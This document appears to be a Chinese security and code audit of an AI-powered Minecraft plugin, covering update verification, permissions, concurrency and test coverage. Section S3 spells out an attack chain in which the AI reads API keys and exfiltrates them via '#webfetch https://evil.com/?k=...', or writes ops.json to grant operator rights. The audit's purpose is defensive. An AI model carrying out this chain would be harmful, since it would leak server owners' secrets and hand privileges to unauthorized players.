# FancyHelper 全代码审查报告（2026-09-13）

> 覆盖范围：src/main/java 全部 29540 行（6 个分区并行通读）+ worker/ + 测试套件抽查。
> 背景：项目为全程 AI 生成（vibecoding），早期使用较弱模型。
> 方法：逐文件通读，只报有代码证据的真问题，已做跨区去重。

## 总评

**架构意识明显好于平均水平，但"最后一步"普遍缺失。** 三级镜像级联、lastgood 配置兜底、WatchService+mtime 双保险、看门狗断流、思考循环检测——设计层面都能看出经过思考。但完整性校验、原子写入、权限检查、异常处理这些收尾环节几乎每一处都停在 80%。另有一个系统性主题：**并发模型**——状态管理是"半同步"（个别方法加锁、多数写者裸奔），这比完全不同步更危险，因为它给人安全的错觉。

约 80 个真问题中，最危险的不是 bug，而是**安全门禁架错了层**：确认按钮、风险白名单、验证流程都架在"提示词/UI 层"，而执行层（文件写入、bind 命令、自更新下载）存在系统性旁路。

## P0 安全（必须修）

### S1. 插件自更新零校验 + 第三方镜像优先 = 供应链 RCE
- `UpdateManager.java:261-284`：下载后直接 `Files.copy(...REPLACE_EXISTING)` 写入 plugins 目录，无 hash/签名/大小校验。
- `UpdateManager.java:347-365`：级联顺序 ghproxy.vip（第三方）→ GitHub → CDN，镜像排在第一。
- **Worker 端已生成 sha256 字段（worker/src/index.js:65-78），客户端从未读取**——校验链服务端建好了，客户端断掉。
- 叠加：`html_url`（Release 网页 HTML）可能被当 jar 下载（216-223）；远程 version 字符串无路径过滤直接拼文件名（157-160）；旧 jar 不删除（Windows 双插件冲突）；`auto_upgrade: true` 时启动即无人值守自安装（94-99）。
- 同类：`/cli lib install`（CLICommand.java:1900-1963）下载 ProtocolLib 也无校验。

### S2. `/cli bind` 无权限检查，任意玩家改写全服 API Key
- `CLICommand.java:90-95`：case "bind" 只检查 instanceof Player；其他子命令都有 hasPermission。
- `handleBind` → `FancyConsoleManager.setApiKey` 写全服共享 `client-fancy.yml`。任何默认玩家可换成自己的 key（盗刷）或垃圾值（全服瘫痪）。

### S3. 文件工具无敏感路径黑名单，AI 可读密钥、写 ops.json
- `ToolExecutor.java:1462-1475`：唯一防线 isWithinRoot（canonical path，穿越/符号链接防护本身正确），但根目录=服务器根，`plugins/FancyHelper/config.yml`（含 openai/tavily/metaso 三把 key）、`ops.json`、`server.properties` 全在根内。
- 攻击链：`#read config.yml` → key 进 AI 上下文 → `#webfetch https://evil.com/?k=...`（GET 即外传）。
- `#write ops.json` 直接发 op，完全绕过针对命令的 YOLO 风险词确认（isRiskyCommand 只管命令不管文件）。

### S4. YOLO 模式 #write/#edit 绕过全部验证
- `ToolExecutor.java:619-625`：ls/read 分支检查冻结+工具开关+首次验证，write/edit 分支在 YOLO 下什么都没有（NORMAL/SMART 靠确认流程补上了）。
- 被冻结玩家（验证失败 3 次）在 YOLO 会话里照样让 AI 写文件。

### S5. 硬编码共享 Cloudflare API key 打进发布物
- `LLMClient.java:963`、`ConfigManager.java:279`：`"maF_cBg4UXnWgTaE8t8tdAq-..."` 两处硬编码，已进 git 历史。任何人可提取消耗开发者配额。**应作泄漏处理并轮换。**

### S6. view-fancy 在玩家确认前就把全文上传第三方
- `ToolExecutor.java:656-675`：pushPreviewLinkAsync 在确认前 submitToViewFancy(args) 上传全文；玩家点 ✘ 取消后内容已出服务器；无大小限制。

### S7. 权限模型多处松散
- `/cli mcp toggle` 无权限（CLICommand.java:197-202）→ 普通玩家启停全服共享的 MCP 工具状态。
- `status`/`stats`/`checkupdate` 无权限；无权限玩家先收到含 server-id 的注册提示再查权限（58-67）；Tab 补全向所有人泄露管理子命令（2009-2023）；`lib install` 用 isOp() 绕过权限系统（1860）。

### S8. onEnable 静默改写 server.properties
- `FancyHelper.java:275-327`：检测到 enforce-secure-profile 后直接改写关闭，无确认无备份，主线程文件 IO。

## P1 功能坏了 / 用户可感知

### F1. SMART 模式 edit 确认后必然失败（死路径）
- `CLIManager.java:2289` 产生 `"DIFF:" + content`，`ToolExecutor.java:848-865` 只认 ls/read/edit/write 四种 → "错误: 未知操作类型"。SMART 的 edit 走到确认这一步就死了，AI 还会被误导重试。

### F2. MCP 客户端三个协议级缺陷（基本不可用）
- SSE 传输下 tools/call 永远收不到响应：`McpClient.java:127-188` reader 线程丢弃真正的 JSON-RPC 响应，`sendRequest` 只读 POST 同步体（SSE 服务器通常回 202）。
- 断线永不重连：`getDisconnectedServers()` 判据 `!clients.containsKey(name)` 永假（断线客户端还在 map 里）；ping 失败只记 fine 日志。
- SSE 请求 30 秒被 request timeout 掐断且状态仍是"已连接"；sessionId 存了从不发送（Mcp-Session-Id header 零命中）；disconnect 只 interrupt 不关流（阻塞读不响应中断）。

### F3. 正文含 `#` 字符 → 流式回复静默截断
- `StreamingHandler.java:336-352`：`indexOf('#')` 即置 toolCallDetected，后续 chunk 不再进玩家缓冲。URL 锚点、"#1" 编号、话题标签都会触发，且无恢复路径。

### F4. 批次超时后迟到反馈触发第二次模型重入
- `CLIManager.java:4842-4854`：forceFinalizeBatch 置 batchInProgress=false 并 invokeModelAfterFeedback；慢工具的反馈随后到达 → 条件已不成立 → 再次重入。双份计费、历史乱序、isGenerating 拦不住。

### F5. token 双重计入，统计虚高近一倍
- `CLIManager.java:2644-2653 + 2864-2885`：usage 回调与 onComplete 各 add 一次同一批 output tokens；输入估算与实际值叠加不回滚。autoCompressContext 阈值判断随之失真。

### F6. Paper 服双聊天事件监听：一条消息两次进入 handleChat 的隐患
- `ChatListener.java:58-79 + 110-165`：Bukkit 老事件（AsyncPlayerChatEvent）与 Paper 新事件（AsyncChatEvent，反射注册）**都调用 handleChat**，代码注释自己承认 Paper 会同时触发两者（为兼容 TrChat 等听老事件的聊天插件，两个都得拦）。
- **实测（2026-09-13，测试服 Paper 1.21.4）未复现**：CLI 模式发一条消息，全程无假警告、只有一次 AI 响应——Paper 在新事件被取消后不再触发老事件，正常 CLI 路径只有一次处理。
- 降级结论：当前不产生用户可见症状，但插件自身没有去重，正确性完全依赖 Paper 的事件语义（取消传播+触发顺序）。不同 Paper 版本/fork 语义变化时，症状是：第二条命中 isGenerating 守卫 → 玩家每条消息收到假"请不要在 Fancy 生成内容时发送消息"（clim.warn.no.send）。建议加一个同消息短窗口去重的自保险，摆脱对服务端实现的依赖。

### F7. Server Memory 动态段破坏 prompt cache（性能卖点自败）
- `PromptManager.java:352-402`：段 6 按当前消息做 Top-K 筛选、每次都变，却排在全部历史消息之前（LLMClient.java:308-322）。设计注释自己写了"放在历史之前会把缓存作废"，恰好违反。

### F8. GuiManager 按标题匹配 GUI 且不校验点击位置 → 玩家物品被覆盖
- `GuiManager.java:236-243 + 269`：点击自己底部背包第 10/16/18 格时 setItem 直接替换玩家物品（事件 cancel 但代码仍执行）；同名标题第三方 GUI 会误触发。

## P2 并发系统性弱点（最大的质量主题）

- `CLIManager.java:44-58,114`：约 20 个以 UUID 为 key 的普通 HashMap/HashSet，聊天异步线程与主线程并发读写，无同步。`AsyncPlayerChatEvent` 直接调 handleChat。
- `DialogueSession.java`："半同步"——`appendToLastUserMessage` 有 synchronized，`addMessage`/`clearHistory` 没有；getHistory 返回内部引用。半同步比不同步更危险。
- `DialogueSession.java:726-778`：批次双队列（工具+force 标志）非原子 push，并发下工具与 force 错位 → **YOLO 语义被绕过或错误确认**。这是核心调度路径。
- 确认流程 TOCTOU：containsKey→get→remove 非原子（CLIManager.java:2139-2162 等），双击/聊天+按钮并发 = 命令执行两次。
- `volatile long +=` 非原子（DialogueSession.java:401）；nextMessageId++ 无保护 → 消息串号。
- McpClientManager.toolStates 内层 LinkedHashMap 跨线程裸奔（McpClientManager.java:174-183）。
- FileWatcherManager 防抖表普通 HashMap 双线程读写（FileWatcherManager.java:20,118-128,164-169）。

## 好的方面（核实过，不是客套）

- 路径安全核心正确：isWithinRoot 用 canonical path，`../` 与符号链接逃逸真的拦得住。
- 热重载专项：唯一 static 可变状态是 ChatListener 一个布尔和 I18n.plugin（volatile，每次 enable 重建），**没有**经典 static-旧classloader 泄漏。
- 统计上报隐私面干净：只有环境信息+聚合计数，无玩家名/UUID/IP。
- 异步回主线程纪律普遍到位（先查 plugin.isEnabled() 再 runTask）。
- I18n 三语 512 key 完全对齐（逐 key 对比过），无漂移。
- ResponseParserTest/ToolExecutorTest/JsonRpcHandlerTest 是真实的行为测试，解析回归可信。
- 每次写盘失败回灌 AI 的自觉性贯穿工具层（批次屏障设计本身是对的）。

## 测试套件评价（469 个测试的可信度）

- 真逻辑测试不错（解析层、风险命令匹配、批量执行）。
- 但约七成测试行数在"验证 Mockito 转发"而非行为（ConfigManagerTest 大部分）。
- **三大风险区零覆盖**：并发（全库 grep 无一处并发测试）、网络（McpClient/CloudErrorReport 零测试）、状态机（DialogueSession 批次队列/appendToLastUserMessage 一行未测）。
- 结论：绿灯提供的是部分信心——解析层可信，调度层不可信。

## 建议修复顺序

1. **S1 自更新校验**（sha256 现成的，接上即可）+ 镜像顺序调换——工作量小、风险最大。
2. **S2/S7 权限**（bind/mcp/status/checkupdate + Tab 过滤）——一天内能清完。
3. **S3/S4 文件工具收口**（敏感路径黑名单 + YOLO 写验证）——安全主题收尾。
4. **S5 硬编码 key 移除并轮换**（git 历史里已泄漏）。
5. **F1 SMART DIFF 死路径**（小改，用户可感知）。
6. **F6 聊天双事件去重**（小改）。
7. **F4/F5 批次屏障与 token 双计**（中等，需要小心）。
8. **P2 并发治理**（大工程：建议 DialogueSession 内部加锁统一 → CLIManager 状态收敛成 ConcurrentHashMap 或状态对象 → 清理路径统一成一个 cleanup(uuid)）。
9. **F2 MCP 客户端**（重写 SSE 传输或暂时下线该功能，当前状态是"看起来能用其实不可用"）。
